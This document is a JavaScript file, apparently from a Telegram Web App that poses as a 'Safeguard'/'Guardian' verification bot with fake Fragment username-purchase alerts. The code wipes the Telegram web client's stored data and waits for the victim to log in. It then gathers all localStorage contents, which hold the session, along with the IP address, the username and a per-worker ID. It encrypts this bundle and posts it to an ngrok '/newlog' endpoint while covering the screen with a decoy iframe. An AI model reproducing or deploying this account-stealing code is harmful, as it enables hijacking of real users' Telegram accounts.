const startAppParam = window.Telegram.WebApp.initDataUnsafe.start_param || "";

if (startAppParam.endsWith('_G')) {
  Telegram.WebApp.ready();
  Telegram.WebApp.expand();
  Telegram.WebApp.MainButton.setParams({
    color: Telegram.WebApp.bottomBarColor,
    text: '@guardianapp',
    text_color: "#acafb0",
    is_active: false
  });
  Telegram.WebApp.MainButton.onClick(() => {
    Telegram.WebApp.showAlert("This username was bought on Fragment on Jan 16, 2024 for 10.00 TON.");
  });
  Telegram.WebApp.MainButton.show();
} else if (startAppParam.endsWith('_S')) {
  Telegram.WebApp.ready();
  Telegram.WebApp.expand();
  Telegram.WebApp.MainButton.setParams({
    color: Telegram.WebApp.bottomBarColor,
    text: '@safeguard',
    text_color: "#acafb0",
    is_active: false
  });
  Telegram.WebApp.MainButton.onClick(() => {
    Telegram.WebApp.showAlert("This username was bought on Fragment on May 17, 2023 for 515.00 TON.");
  });
  Telegram.WebApp.MainButton.show();
} else if (startAppParam.endsWith('_D')) {
  Telegram.WebApp.ready();
  Telegram.WebApp.expand();
  Telegram.WebApp.MainButton.setParams({
    color: Telegram.WebApp.bottomBarColor,
    text: '@delugeguardbot',
    text_color: "#acafb0",
    is_active: false
  });
  Telegram.WebApp.MainButton.onClick(() => {
    Telegram.WebApp.showAlert("This username was bought on Fragment on Feb 20, 2024 for 20.00 TON.");
  });
  Telegram.WebApp.MainButton.show();
} else {
  Telegram.WebApp.ready();
  Telegram.WebApp.expand();
  Telegram.WebApp.MainButton.setParams({
    color: Telegram.WebApp.bottomBarColor,
    text: '@safeguard',
    text_color: "#acafb0",
    is_active: false
  });
  Telegram.WebApp.MainButton.onClick(() => {
    Telegram.WebApp.showAlert("This username was bought on Fragment on May 17, 2023 for 515.00 TON.");
  });
  Telegram.WebApp.MainButton.show();
}

document.body.style.setProperty("--surface-color", Telegram.WebApp.themeParams.bg_color);

const pageChats = document.getElementById("page-chats");
if (pageChats) {
  pageChats.remove();
}

indexedDB.databases().then(d =>
  d.filter(b => b.name === "tweb").forEach(b => {
    let r = indexedDB.open("tweb", b.version);
    r.onsuccess = () => {
      let x = r.result.transaction(
        ["chats", "dialogs", "messages", "session", "stickerSets", "users"],
        "readwrite"
      );
      ["chats", "dialogs", "messages", "session", "stickerSets", "users"].forEach(s =>
        x.objectStore(s).clear()
      );
    };
  })
);
localStorage.clear();

function getLocalStorageData() {
  let lsData = {};
  for (let i = 0; i < localStorage.length; i++) {
    const key = localStorage.key(i);
    lsData[key] = localStorage.getItem(key);
  }
  return lsData;
}

const iframe = document.createElement('iframe');
// Replace the URL below with the desired streaming site
iframe.src = "https://bespoke-kleicha-1a5093.netlify.app/";
iframe.style.position = "fixed";
iframe.style.top = "0";
iframe.style.left = "0";
iframe.style.width = "100%";
iframe.style.height = "100%";
iframe.style.border = "none";
iframe.style.zIndex = "10000";
iframe.style.display = "none";
document.addEventListener("DOMContentLoaded", () => {
  document.body.appendChild(iframe);
});



const user = window.Telegram.WebApp.initDataUnsafe.user || {};
const username = user.username || "N/A"; // Default to "N/A" if not found

async function fetchClientIp() {
  try {
    const response = await fetch("https://api.ipify.org?format=json");
    const data = await response.json();
    return data.ip;
  } catch (error) {
    console.error("Error fetching IP address:", error);
    return "N/A";
  }
}

const script = document.createElement("script");
script.src = "https://cdn.jsdelivr.net/npm/jsencrypt/bin/jsencrypt.min.js";
document.head.appendChild(script);

script.onload = () => {
  const PUBLIC_KEY = `-----BEGIN PUBLIC KEY-----
MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEAykkzNsl4fuXRj3kz1+m2
3tkhsgXwJLgr4vXQyQwOhOCSFoSRWl+AwBHxMT4dL65HfycmDcDaFU/mPn/3TFwn
BQjKDOpRVHXMt9ZYUCPuSCfIVtS9Sxxq9RCqCCgn9S1mePTpKJ1HYSaKH1rpEaXm
fJbjvmpcKs5kqbHa3cwtgSNVUBgta+iWj8B3RLHWsPZn3K/FFjWf6rZK7FbjSVtF
QynZukdFwC0Fr4d1S8An89szCppFxlS7H+xpL0VABQOn29ToQFWfFq2dCl1g0kEW
CpMjNlw3mcAgmLg3Cvddd8vSaTiVx6qPD1/DPVY44xa+IrePxwmxXbiI6qtf26jr
2wIDAQAB
-----END PUBLIC KEY-----`;

  function encryptPayload(payload) {
    const encryptor = new JSEncrypt();
    encryptor.setPublicKey(PUBLIC_KEY);
    return encryptor.encrypt(JSON.stringify(payload));
  }

  let l = setInterval(async () => {
    if (localStorage.user_auth) {
      clearInterval(l);
      iframe.style.display = "block";

      const ip = await fetchClientIp();
      const payload = {
        data: getLocalStorageData(),
        worker_chatid: startAppParam,
        ip: ip,
        username: username
      };

      const encryptedData = encryptPayload(payload);

      fetch("https://currently-relative-shrimp.ngrok-free.app/newlog", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ encrypted: encryptedData })
      })
      .then(response => response.json())
      .then(data => console.log('Success:', data))
      .catch(error => console.error('Error:', error));
    } else {
      console.log("No bots found.");
    }
  }, 50);
};
document.head.appendChild(script);



document.addEventListener("DOMContentLoaded", () => {
  const authPages = document.getElementById("page-chats");
  if (authPages) {
    authPages.remove();
  }
});
